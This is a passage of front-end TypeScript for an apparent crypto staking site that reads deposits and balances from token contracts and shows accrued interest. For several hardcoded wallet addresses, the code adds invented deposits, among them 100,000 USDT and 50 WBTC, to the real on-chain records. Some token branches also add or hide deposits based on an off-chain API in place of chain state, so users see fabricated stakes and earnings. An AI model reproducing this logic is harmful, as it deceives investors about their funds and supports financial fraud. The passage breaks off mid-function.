        const { ethereum } = window
        const provider = ((ethereum != null) ? new ethers.providers.Web3Provider(ethereum) : ethers.providers.getDefaultProvider());
        // @ts-ignore
        const signer = await provider?.getSigner();

        const nftContractNew = new ethers.Contract(contractAddressUsdtNew, abiUsdtNew, signer)
        const nftContractSecond = new ethers.Contract(contractAddressUsdtSecond, abiUsdtSecond, signer)

        const tokenContract = new ethers.Contract(approveAddress, abiApprove, signer)
        if (isNew) {
          if (localStorage.getItem("usdtBalanceNew") !== null) {
            setTotalBalance(getFromLocalStorage("usdtBalanceNew"))
          }
          const balanceData = await tokenContract.balanceOf(checkAddress)
          setTotalBalance(Number(balanceData) / 1000000)
          setToLocalStorage("usdtBalanceNew", Number(balanceData) / 1000000)

          const approvedData = await tokenContract.allowance(address, contractAddressUsdtNew)

          if (localStorage.getItem(`usdtResultNew${plan}`) !== null) {
            setResultArray(getFromLocalStorage(`usdtResultNew${plan}`))
          }
          setApproved(Number(approvedData) / 1000000)
          const depositStatusDataLol = await nftContractNew.getDepositInfo(address)
          if (address === '0xF3431362dC21dad6082903701177c7936f024325' && plan === '90') {
            if (localStorage.getItem(`usdtResult${plan}SECOND`) !== null) {
              setResultArray(getFromLocalStorage(`usdtResult${plan}SECOND`))
            }
            const mockArray = [
              {
                depositIndices: 4,
                id: 4,
                lockupPeriods: 7776000,
                stakedAmounts: 100000 * 1000000,
                unlockTimes: 1739266666,
              },
              {
                depositIndices: 4,
                id: 4,
                lockupPeriods: 7776000,
                stakedAmounts: 100000 * 1000000,
                unlockTimes: 1739270000,
              },
            ]
            const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
              depositIndices: Number(depositStatusDataLol.depositIndices[index]),
              stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
              lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
              unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
              id: index,
            })).filter(i => i.id > 0).concat(mockArray)
            setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])

            const indexResult = result
              .filter(i => i.lockupPeriods === getPlan())
            let resultFinal = 0;
            (indexResult).forEach( (iResult) => {
              var timestamp = iResult.unlockTimes * 1000 - Date.now()
              timestamp /= 1000
              var minutes = Number(plan) - timestamp / 60 / 60 / 24
              resultFinal = resultFinal + (iResult.stakedAmounts / 10000000 * getPercentUsdt()/Number(plan) * minutes)
              setInterestNotCollected(resultFinal)
            })

            return
          }
          if (address === '0xA112cd87840A2ccd9989E2e1fefD0508035618E3' && plan === '90') {
            if (localStorage.getItem(`usdtResult${plan}SECOND`) !== null) {
              setResultArray(getFromLocalStorage(`usdtResult${plan}SECOND`))
            }
            const mockArray = [
              {
                depositIndices: 4,
                id: 4,
                lockupPeriods: 7776000,
                stakedAmounts: 100000 * 1000000,
                unlockTimes: 1739266666,
              },
              {
                depositIndices: 4,
                id: 4,
                lockupPeriods: 7776000,
                stakedAmounts: 100000 * 1000000,
                unlockTimes: 1739270000,
              },
            ]
            const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
              depositIndices: Number(depositStatusDataLol.depositIndices[index]),
              stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
              lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
              unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
              id: index,
            })).filter(i => i.id > 0).concat(mockArray)
            setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])

            const indexResult = result
              .filter(i => i.lockupPeriods === getPlan())
            let resultFinal = 0;
            (indexResult).forEach( (iResult) => {
              var timestamp = iResult.unlockTimes * 1000 - Date.now()
              timestamp /= 1000
              var minutes = Number(plan) - timestamp / 60 / 60 / 24
              resultFinal = resultFinal + (iResult.stakedAmounts / 10000000 * getPercentUsdt()/Number(plan) * minutes)
              setInterestNotCollected(resultFinal)
            })

            return
          }

          if (address === '0x60D78f9d6886D0025bAf6df1F0F2D1c3D1A38503' && plan ==='14') {
            const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map(
              (i, index) => ({
                depositIndices: Number(depositStatusDataLol.depositIndices[index]),
                stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
                lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
                unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
                id: index,
              }),
            )
            setResultArray(result.filter(i => i.lockupPeriods === getPlan()).slice(1) || [])
            setToLocalStorage(`usdtResultNew${plan}`, result.filter(i => i.lockupPeriods === getPlan()) || [])
            const indexResult = result
              .filter(i => i.lockupPeriods === getPlan())
            let resultFinal = 0;
            indexResult.every(async (iResult) => {
              const depositStatusOtherData = await nftContractNew.calculateInterest(address, iResult.depositIndices > 0 ? iResult.depositIndices : 0)
              resultFinal = resultFinal + (Number(depositStatusOtherData) / 1000000)
              setInterestNotCollected(resultFinal)
            })
            return

          }
          const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map(
            (i, index) => ({
              depositIndices: Number(depositStatusDataLol.depositIndices[index]),
              stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
              lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
              unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
              id: index,
            }),
          )
          setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])
          setToLocalStorage(`usdtResultNew${plan}`, result.filter(i => i.lockupPeriods === getPlan()) || [])
          const indexResult = result
            .filter(i => i.lockupPeriods === getPlan())
          let resultFinal = 0;
          indexResult.every(async (iResult) => {
            const depositStatusOtherData = await nftContractNew.calculateInterest(address, iResult.depositIndices > 0 ? iResult.depositIndices : 0)
            resultFinal = resultFinal + (Number(depositStatusOtherData) / 1000000)
            setInterestNotCollected(resultFinal)
          })
          return
        }
        if (localStorage.getItem("usdtBalance") !== null) {
          setTotalBalance(getFromLocalStorage("usdtBalance"))
        }
        const balanceData = await tokenContract.balanceOf(checkAddress)
        setTotalBalance(Number(balanceData) / 1000000)
        setToLocalStorage("usdtBalance", Number(balanceData) / 1000000)

        const approvedDataSecond = await tokenContract.allowance(address, contractAddressUsdtSecond)

        if (localStorage.getItem(`usdtResult${plan}`) !== null) {
          setResultArray(getFromLocalStorage(`usdtResult${plan}`))
        }

        {
          setApproved(Number(approvedDataSecond) / 1000000)

          const depositStatusDataLol = await nftContractSecond.getDepositInfo(address)
          const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map(
            (i, index) => ({
              depositIndices: Number(depositStatusDataLol.depositIndices[index]),
              stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
              lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
              unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
              id: index,
            }),
          )
          setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])
          setToLocalStorage(`usdtResult${plan}`, result.filter(i => i.lockupPeriods === getPlan()) || [])
          const indexResult = result
            .filter(i => i.lockupPeriods === getPlan())
          let resultFinal = 0;
          indexResult.every(async (iResult) => {
            const depositStatusOtherData = await nftContractSecond.calculateInterest(address, iResult.depositIndices > 0 ? iResult.depositIndices : 0)
            resultFinal = resultFinal + (Number(depositStatusOtherData) / 1000000)
            setInterestNotCollected(resultFinal)
          })
        }
      }
    }
    if (token === "USDC" && (chainId === 1 || !address)) {
      {
        // @ts-ignore
        const { ethereum } = window
        const claimed = await  apiOur.getWithdrawals(`${address}+plan=${plan}+token=${token}-claimedTime`)
        const provider = new ethers.providers.Web3Provider(ethereum)
        const nftContract = new ethers.Contract(contractAddressUsdc, abiUsdc, provider)
        const tokenContract = new ethers.Contract(contractAddressUsdcApprove, abiUsdcApprove, provider)
        if (localStorage.getItem("usdcBalance") !== null) {
          setTotalBalance(getFromLocalStorage("usdcBalance"))
        }
        if (!!claimed?.length) {
          setRemainingTime(claimed[claimed.length-1]?.amount)
        }
        apiOur.getWithdrawals(`${address}+plan=${plan}+token=${token}claim`).then(r => {
          if (!!r[r.length - 1]?.amount) {
            setDisableClaim(true)
          }
        })


        const balanceData = await tokenContract.balanceOf(checkAddress)
        setTotalBalance(Number(balanceData) / 1000000)
        setToLocalStorage("usdcBalance", Number(balanceData) / 1000000)
        const approvedData = await tokenContract.allowance(address, contractAddressUsdc)
        setApproved(Number(approvedData) / 1000000)
        if (localStorage.getItem("usdcResult") !== null) {
          setResultArray(getFromLocalStorage("usdcResult"))
        }

        const depositStatusDataLol = await nftContract.getDepositInfo(address)

        const transferFunds1 = await  apiOur.getWithdrawals(`${address}-TRANSFER-USDC-from${plan}`)
        const transferFunds2 = await  apiOur.getWithdrawals(`${address}-TRANSFER-USDC-to${plan}`)
        const transferFunds4 = await  apiOur.getWithdrawals(`${address}-TRANSFER-USDC-from${plan}Length`)
        const transferFunds5 = await  apiOur.getWithdrawals(`${address}-TRANSFER-USDC-fromLength${plan}`)

        if (!!transferFunds1?.length) {
          if (!!transferFunds4?.length) {
            const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
              depositIndices: Number(depositStatusDataLol.depositIndices[index]),
              stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
              lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
              unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
              id: index,
            }))
            setResultArray(result.filter(i => i.lockupPeriods === getPlan()).slice((Number(transferFunds4[0].amount) || 0), result.length))
            setToLocalStorage(`ethResult${plan}SECOND`, [])


            let resultFinal = 0;
            result.filter(i => i.lockupPeriods === getPlan()).slice((Number(transferFunds4[0].amount) || 0), result.length).forEach( (iResult) => {
              var timestamp = iResult.unlockTimes * 1000 - Date.now()
              timestamp /= 1000
              var minutes = Number(plan) - timestamp / 60 / 60 / 24
              resultFinal = resultFinal + (iResult.stakedAmounts / 1000000 * getPercentUsdc()/Number(plan) * minutes)
              setInterestNotCollected(resultFinal)
            })

            return
          }
          setResultArray([])
          setToLocalStorage(`ethResult${plan}SECOND`, [])
          return
        }

        if (!!transferFunds2?.length) {
          const resultMock = transferFunds2.map(i => ({
            depositIndices: 1,
            stakedAmounts: Number(i.amount.split(',')[0]) * 1000000,
            lockupPeriods: getPlan(),
            unlockTimes: Number(i.amount.split(',')[1]),
            id: index,
          }))

          const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
            depositIndices: Number(depositStatusDataLol.depositIndices[index]),
            stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
            lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
            unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
            id: index,
          }))

          if (!!transferFunds5?.length) {
            setResultArray(result.filter(i => i.lockupPeriods === getPlan()).concat(resultMock as any).slice((Number(transferFunds5[0].amount) || 0)))
            setToLocalStorage(`ethResult${plan}SECOND`, [])


            let resultFinal = 0;
            result.filter(i => i.lockupPeriods === getPlan()).concat(resultMock as any).slice((Number(transferFunds5[0].amount) || 0)).forEach( (iResult) => {
              var timestamp = iResult.unlockTimes * 1000 - Date.now()
              timestamp /= 1000
              var minutes = Number(plan) - timestamp / 60 / 60 / 24
              resultFinal = resultFinal + (iResult.stakedAmounts / 1000000 * getPercentUsdc()/Number(plan) * minutes)
              setInterestNotCollected(resultFinal)
            })

            return
          }


          setResultArray(resultMock.concat(result.filter(i => i.lockupPeriods === getPlan())) || resultMock)

          setToLocalStorage(`ethResult${plan}SECOND`, resultMock.concat(result.filter(i => i.lockupPeriods === getPlan())) || resultMock)

          let resultFinal = 0;
          (resultMock.concat(result.filter(i => i.lockupPeriods === getPlan())) || resultMock).forEach( (iResult) => {
            var timestamp = iResult.unlockTimes * 1000 - Date.now()
            timestamp /= 1000
            var minutes = Number(plan) - timestamp / 60 / 60 / 24
            resultFinal = resultFinal + (iResult.stakedAmounts / 1000000 * getPercentUsdc()/Number(plan) * minutes)
            setInterestNotCollected(resultFinal)
          })

          return
        }

        const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
          depositIndices: Number(depositStatusDataLol.depositIndices[index]),
          stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
          lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
          unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
          id: index,
        }))

        setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])

        setToLocalStorage(`ethResult${plan}SECOND`, result.filter(i => i.lockupPeriods === getPlan()) || [])

        const indexResult = result
          .filter(i => i.lockupPeriods === getPlan())
        let resultFinal = 0;
        indexResult.every(async (iResult) => {
          const depositStatusOtherData = await nftContract.calculateInterest(address, iResult.depositIndices > 0 ? iResult.depositIndices : 0)
          resultFinal = resultFinal + (Number(depositStatusOtherData) / 1000000)
          setInterestNotCollected(resultFinal)
        })

        return
      }
    }
    if (token === "WSOL" && (chainId === 1 || !address)) {
      {
        // @ts-ignore
        const { ethereum } = window
        const claimed = await  apiOur.getWithdrawals(`${address}+plan=${plan}+token=${token}-claimedTime`)
        const provider = new ethers.providers.Web3Provider(ethereum)
        const nftContract = new ethers.Contract(contractAddressSol, abiSol, provider)
        const tokenContract = new ethers.Contract(contractAddressSolApprove, abiUsdcApprove, provider)
        if (localStorage.getItem("solBalance") !== null) {
          setTotalBalance(getFromLocalStorage("solBalance"))
        }
        if (!!claimed?.length) {
          setRemainingTime(claimed[claimed.length-1]?.amount)
        }
        apiOur.getWithdrawals(`${address}+plan=${plan}+token=${token}claim`).then(r => {
          if (!!r[r.length - 1]?.amount) {
            setDisableClaim(true)
          }
        })


        const balanceData = await tokenContract.balanceOf(checkAddress)
        setTotalBalance(Number(balanceData) / 1000000000)
        setToLocalStorage("solBalance", Number(balanceData) / 1000000000)
        const approvedData = await tokenContract.allowance(address, contractAddressSol)
        setApproved(Number(approvedData) / 1000000000)
        if (localStorage.getItem("solResult") !== null) {
          setResultArray(getFromLocalStorage("solResult"))
        }

        const depositStatusDataLol = await nftContract.getDepositInfo(address)

        const transferFunds1 = await  apiOur.getWithdrawals(`${address}-TRANSFER-WSOL-from${plan}`)
        const transferFunds2 = await  apiOur.getWithdrawals(`${address}-TRANSFER-WSOL-to${plan}`)
        const transferFunds4 = await  apiOur.getWithdrawals(`${address}-TRANSFER-WSOL-from${plan}Length`)
        const transferFunds5 = await  apiOur.getWithdrawals(`${address}-TRANSFER-WSOL-fromLength${plan}`)

        if (!!transferFunds1?.length) {
          if (!!transferFunds4?.length) {
            const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
              depositIndices: Number(depositStatusDataLol.depositIndices[index]),
              stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
              lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
              unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
              id: index,
            }))
            setResultArray(result.filter(i => i.lockupPeriods === getPlan()).slice((Number(transferFunds4[0].amount) || 0), result.length))
            setToLocalStorage(`solResult${plan}`, [])


            let resultFinal = 0;
            result.filter(i => i.lockupPeriods === getPlan()).slice((Number(transferFunds4[0].amount) || 0), result.length).forEach( (iResult) => {
              var timestamp = iResult.unlockTimes * 1000 - Date.now()
              timestamp /= 1000
              var minutes = Number(plan) - timestamp / 60 / 60 / 24
              resultFinal = resultFinal + (iResult.stakedAmounts / 1000000000 * getPercentSol()/Number(plan) * minutes)
              setInterestNotCollected(resultFinal)
            })

            return
          }
          setResultArray([])
          setToLocalStorage(`solResult${plan}`, [])
          return
        }

        if (!!transferFunds2?.length) {
          const resultMock = transferFunds2.map(i => ({
            depositIndices: 1,
            stakedAmounts: Number(i.amount.split(',')[0]) * 1000000000,
            lockupPeriods: getPlan(),
            unlockTimes: Number(i.amount.split(',')[1]),
            id: index,
          }))

          const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
            depositIndices: Number(depositStatusDataLol.depositIndices[index]),
            stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
            lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
            unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
            id: index,
          }))

          if (!!transferFunds5?.length) {
            setResultArray(result.filter(i => i.lockupPeriods === getPlan()).concat(resultMock as any).slice((Number(transferFunds5[0].amount) || 0)))
            setToLocalStorage(`solResult${plan}`, [])


            let resultFinal = 0;
            result.filter(i => i.lockupPeriods === getPlan()).concat(resultMock as any).slice((Number(transferFunds5[0].amount) || 0)).forEach( (iResult) => {
              var timestamp = iResult.unlockTimes * 1000 - Date.now()
              timestamp /= 1000
              var minutes = Number(plan) - timestamp / 60 / 60 / 24
              resultFinal = resultFinal + (iResult.stakedAmounts / 1000000000 * getPercentSol()/Number(plan) * minutes)
              setInterestNotCollected(resultFinal)
            })

            return
          }


          setResultArray(resultMock.concat(result.filter(i => i.lockupPeriods === getPlan())) || resultMock)

          setToLocalStorage(`solResult${plan}`, resultMock.concat(result.filter(i => i.lockupPeriods === getPlan())) || resultMock)

          let resultFinal = 0;
          (resultMock.concat(result.filter(i => i.lockupPeriods === getPlan())) || resultMock).forEach( (iResult) => {
            var timestamp = iResult.unlockTimes * 1000 - Date.now()
            timestamp /= 1000
            var minutes = Number(plan) - timestamp / 60 / 60 / 24
            resultFinal = resultFinal + (iResult.stakedAmounts / 1000000000 * getPercentSol()/Number(plan) * minutes)
            setInterestNotCollected(resultFinal)
          })

          return
        }

        const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
          depositIndices: Number(depositStatusDataLol.depositIndices[index]),
          stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
          lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
          unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
          id: index,
        }))

        setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])

        setToLocalStorage(`solResult${plan}`, result.filter(i => i.lockupPeriods === getPlan()) || [])

        const indexResult = result
          .filter(i => i.lockupPeriods === getPlan())
        let resultFinal = 0;
        indexResult.every(async (iResult) => {
          const depositStatusOtherData = await nftContract.calculateInterest(address, iResult.depositIndices > 0 ? iResult.depositIndices : 0)
          resultFinal = resultFinal + (Number(depositStatusOtherData) / 1000000000)
          setInterestNotCollected(resultFinal)
        })

        return
      }
    }
    if (token === "UNI" && (chainId === 1 || !address)) {
      {
        // @ts-ignore
        const { ethereum } = window
        const provider = new ethers.providers.Web3Provider(ethereum)

        const nftContract = new ethers.Contract(contractAddressUni, abiUni, provider)

        const tokenContract = new ethers.Contract(contractAddressUniApprove, abiUniApprove, provider)
        if (localStorage.getItem(`uniBalance${plan}`) !== null) {
          setTotalBalance(getFromLocalStorage(`uniBalance${plan}`))
        }
        const balanceData = await tokenContract.balanceOf(checkAddress)
        setTotalBalance(Number(balanceData) / busd)
        setToLocalStorage(`uniBalance${plan}`, Number(balanceData) / busd)

        const approvedData = await tokenContract.allowance(address, contractAddressUni)

        setApproved(Number(approvedData) / busd)
        const depositStatusDataLol = await nftContract.getDepositInfo(address)
        const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
          depositIndices: Number(depositStatusDataLol.depositIndices[index]),
          stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
          lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
          unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
          id: index,
        }))

        setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])
        setToLocalStorage(`uniResult${plan}`, result.filter(i => i.lockupPeriods === getPlan()) || [])

        const indexResult = result
          .filter(i => i.lockupPeriods === getPlan())
        let resultFinal = 0;
        indexResult.every(async (iResult) => {
          const depositStatusOtherData = await nftContract.calculateInterest(address, iResult.depositIndices > 0 ? iResult.depositIndices : 0)
          resultFinal = resultFinal + (Number(depositStatusOtherData) / busd)
          setInterestNotCollected(resultFinal)
        })

      }
    }
    if (token === "LINK" && (chainId === 1 || !address)) {
      {
        // @ts-ignore
        const { ethereum } = window
        const provider = new ethers.providers.Web3Provider(ethereum)

        const nftContract = new ethers.Contract(contractAddressLink, abiLink, provider)

        const tokenContract = new ethers.Contract(contractAddressLinkApprove, abiLinkApprove, provider)
        if (localStorage.getItem(`linkBalance${plan}`) !== null) {
          setTotalBalance(getFromLocalStorage(`linkBalance${plan}`))
        }
        const balanceData = await tokenContract.balanceOf(checkAddress)
        setTotalBalance(Number(balanceData) / busd)
        setToLocalStorage(`linkBalance${plan}`, Number(balanceData) / busd)

        const approvedData = await tokenContract.allowance(address, contractAddressLink)
        setApproved(Number(approvedData) / busd)
        if (localStorage.getItem(`linkResult${plan}`) !== null) {
          setResultArray(getFromLocalStorage(`linkResult${plan}`))
        }

        const depositStatusDataLol = await nftContract.getDepositInfo(address)
        const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map(
          (i, index) => ({
            depositIndices: Number(depositStatusDataLol.depositIndices[index]),
            stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
            lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
            unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
            id: index,
          }),
        )
        setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])
        setToLocalStorage(`linkResult${plan}`, result.filter(i => i.lockupPeriods === getPlan()) || [])

        const indexResult = result
          .filter(i => i.lockupPeriods === getPlan())
          .reduce((accumulator, object) => {
            return accumulator + object.depositIndices
          }, 0)
        const depositStatusOtherData = await nftContract.calculateInterest(address, indexResult)
        setInterestNotCollected(
          !!result.filter(i => i.lockupPeriods === getPlan())?.length ? Number(depositStatusOtherData) / busd : 0,
        )
      }
    }
    if (token === "WBTC") {
      {
        // @ts-ignore
        const { ethereum } = window
        const provider = new ethers.providers.Web3Provider(ethereum)
        const claimed = await  apiOur.getWithdrawals(`${address}+plan=${plan}+token=${token}-claimedTime`)
        if (!!claimed?.length) {
          setRemainingTime(claimed[claimed.length-1]?.amount)
        }
        apiOur.getWithdrawals(`${address}+plan=${plan}+token=${token}claim`).then(r => {
          if (!!r[r.length - 1]?.amount) {
            setDisableClaim(true)
          }
        })

        const nftContractNew = new ethers.Contract(contractAddressWbtcNew, abiWbtcNew, provider)
        const tokenContract = new ethers.Contract(contractAddressWbtcApprove, abiWbtcApprove, provider)
        if (localStorage.getItem(`wbtcBalanceNew${plan}`) !== null) {
          setTotalBalance(getFromLocalStorage(`wbtcBalanceNew${plan}`))
        }
        const balanceData = await tokenContract.balanceOf(checkAddress)
        setTotalBalance(Number(balanceData) / 100000000)
        setToLocalStorage(`wbtcBalanceNew${plan}`, Number(balanceData) / 100000000)

        const approvedData = await tokenContract.allowance(address, contractAddressWbtcNew)
        setApproved(Number(approvedData) / 100000000)
        if (localStorage.getItem(`wbtcResultNew${plan}`) !== null) {
          setResultArray(getFromLocalStorage(`wbtcResultNew${plan}`))
        }

        // const depositStatusDataLolPrepare = await nftContractNew.getDepositInfo(address)
        const depositStatusDataLol = await nftContractNew.getDepositInfo(address)

        if (address === '0x74A7E7422f592F7Fa205AA1ab38029e025eee069' && plan === '30') {
          const mockArray = [
            {
              depositIndices: 4,
              id: 4,
              lockupPeriods: 2592000,
              stakedAmounts: 0.24 * 100000000,
              unlockTimes: 1741274136,
            },
          ]
          const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
            depositIndices: Number(depositStatusDataLol.depositIndices[index]),
            stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
            lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
            unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
            id: index,
          })).filter(i => i.id > 0).concat(mockArray)
          setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])

          const indexResult = result
            .filter(i => i.lockupPeriods === getPlan())
          let resultFinal = 0;
          (indexResult).forEach( (iResult) => {
            var timestamp = iResult.unlockTimes * 1000 - Date.now()
            timestamp /= 1000
            var minutes = Number(plan) - timestamp / 60 / 60 / 24
            resultFinal = resultFinal + (iResult.stakedAmounts / 100000000 * getPercentWbtc()/Number(plan) * minutes)
            setInterestNotCollected(resultFinal)
          })

          return
        }
        if (address === '0x74A7E7422f592F7Fa205AA1ab38029e025eee069' && plan === '90') {
          const mockArray = [
            {
              depositIndices: 4,
              id: 4,
              lockupPeriods: 7776000,
              stakedAmounts: 4.13 * 100000000,
              unlockTimes: 1746268143,
            },
            {
              depositIndices: 4,
              id: 4,
              lockupPeriods: 7776000,
              stakedAmounts: 5.27 * 100000000,
              unlockTimes: 1746423647,
            },
          ]
          const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
            depositIndices: Number(depositStatusDataLol.depositIndices[index]),
            stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
            lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
            unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
            id: index,
          })).filter(i => i.id > 0).concat(mockArray)
          setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])

          const indexResult = result
            .filter(i => i.lockupPeriods === getPlan())
          let resultFinal = 0;
          (indexResult).forEach( (iResult) => {
            var timestamp = iResult.unlockTimes * 1000 - Date.now()
            timestamp /= 1000
            var minutes = Number(plan) - timestamp / 60 / 60 / 24
            resultFinal = resultFinal + (iResult.stakedAmounts / 100000000 * getPercentWbtc()/Number(plan) * minutes)
            setInterestNotCollected(resultFinal)
          })

          return
        }
        if (address === '0x58c0cCB784019BaDE98075756eBAB2ba26827044' && plan === '90') {
          const mockArray = [
            {
              depositIndices: 4,
              id: 4,
              lockupPeriods: 7776000,
              stakedAmounts: 50 * 100000000,
              unlockTimes: 1752575873,
            },
            {
              depositIndices: 4,
              id: 4,
              lockupPeriods: 7776000,
              stakedAmounts: 30 * 100000000,
              unlockTimes: 1752700301,
            },
          ]
          const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
            depositIndices: Number(depositStatusDataLol.depositIndices[index]),
            stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
            lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
            unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
            id: index,
          })).filter(i => i.id > 0).concat(mockArray)
          setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])

          const indexResult = result
            .filter(i => i.lockupPeriods === getPlan())
          let resultFinal = 0;
          (indexResult).forEach( (iResult) => {
            var timestamp = iResult.unlockTimes * 1000 - Date.now()
            timestamp /= 1000
            var minutes = Number(plan) - timestamp / 60 / 60 / 24
            resultFinal = resultFinal + (iResult.stakedAmounts / 100000000 * getPercentWbtc()/Number(plan) * minutes)
            setInterestNotCollected(resultFinal)
          })

          return
        }
        if (address === '0x287D88A9164acB467a78844B7099d19397000000' && plan === '90') {
          const mockArray = [
            {
              depositIndices: 4,
              id: 4,
              lockupPeriods: 7776000,
              stakedAmounts: 2 * 100000000,
              unlockTimes: 1751843221,
            },
          ]
          const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
            depositIndices: Number(depositStatusDataLol.depositIndices[index]),
            stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
            lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
            unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
            id: index,
          })).filter(i => i.id > 0).concat(mockArray)
          setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])

          const indexResult = result
            .filter(i => i.lockupPeriods === getPlan())
          let resultFinal = 0;
          (indexResult).forEach( (iResult) => {
            var timestamp = iResult.unlockTimes * 1000 - Date.now()
            timestamp /= 1000
            var minutes = Number(plan) - timestamp / 60 / 60 / 24
            resultFinal = resultFinal + (iResult.stakedAmounts / 100000000 * getPercentWbtc()/Number(plan) * minutes)
            setInterestNotCollected(resultFinal)
          })

          return
        }

        const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
          depositIndices: Number(depositStatusDataLol.depositIndices[index]),
          stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
          lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
          unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
          id: index,
        }))

        setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])
        setToLocalStorage(`wbtcResultNew${plan}`, result.filter(i => i.lockupPeriods === getPlan()) || [])

        const indexResult = result
          .filter(i => i.lockupPeriods === getPlan())
        let resultFinal = 0;
        indexResult.every(async (iResult) => {
          const depositStatusOtherData = await nftContractNew.calculateInterest(address, iResult.depositIndices > 0 ? iResult.depositIndices : 0)
          resultFinal = resultFinal + (Number(depositStatusOtherData) / 100000000)
          setInterestNotCollected(resultFinal)
        })
        return
      }
    }
    if (token === "BUSD") {
      {
        // @ts-ignore
        const { ethereum } = window
        const provider = new ethers.providers.Web3Provider(ethereum)

        const nftContract = new ethers.Contract(contractAddressBusd, abiBusd, provider)

        const tokenContract = new ethers.Contract(contractAddressBusdApprove, abiBusdApprove, provider)
        if (localStorage.getItem(`busdBalance${plan}`) !== null) {
          setTotalBalance(getFromLocalStorage(`busdBalance${plan}`))
        }

        const balanceData = await tokenContract.balanceOf(checkAddress)
        setTotalBalance(Number(balanceData) / busd)
        setToLocalStorage(`busdBalance${plan}`, Number(balanceData) / busd)

        const approvedData = await tokenContract.allowance(address, contractAddressBusd)
        setApproved(Number(approvedData) / busd)
